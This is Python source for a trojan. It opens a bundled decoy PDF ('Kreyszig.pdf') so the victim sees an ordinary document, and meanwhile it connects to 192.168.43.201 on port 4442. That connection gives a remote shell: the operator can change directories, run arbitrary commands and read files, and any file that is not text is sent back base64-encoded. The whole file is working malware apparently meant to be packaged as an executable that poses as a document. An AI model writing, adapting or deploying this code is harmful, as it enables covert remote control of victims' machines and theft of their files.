import socket, subprocess, os, sys, base64
file_name = sys._MEIPASS + "\Kreyszig.pdf"
subprocess.Popen(file_name, shell=True)
def execute(command):
    DEVNULL = open(os.devnull, 'wb')
    return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection.connect(("192.168.43.201", 4442))
except socket.error:
    pass
else:
    rcvd = "[+] connection established"
    while rcvd != "quit":
        rcvd = (connection.recv(1024)).decode()
        if rcvd != "quit":
            try:
                check1=[]
                check=rcvd.split(" ")
                if check[0] == "cd" and len(check)>1:
                    check1=check.copy()
                    check1.pop(0)
                    path = ' '.join(check1)
                    os.chdir(path.strip())
                    res = (os.getcwd()).encode()
                elif check[0] == "read" and len(check)>1:
                    check1=check.copy()
                    check1.pop(0)
                    path = ' '.join(check1)
                    if path[-3:]=="txt":
                        with open(path.strip(),"rb") as file:
                            res = file.read()
                    else:
                        with open(path.strip(),"rb") as file:
                            res = base64.encodestring(file.read())
                else:    
                    res = execute(rcvd)
            except:
                res = ("[+] unable to execute command").encode()
                pass
            connection.send(("\nnext output: \n").encode())
            connection.send(res)                            
    connection.close()
    sys.exit(0)
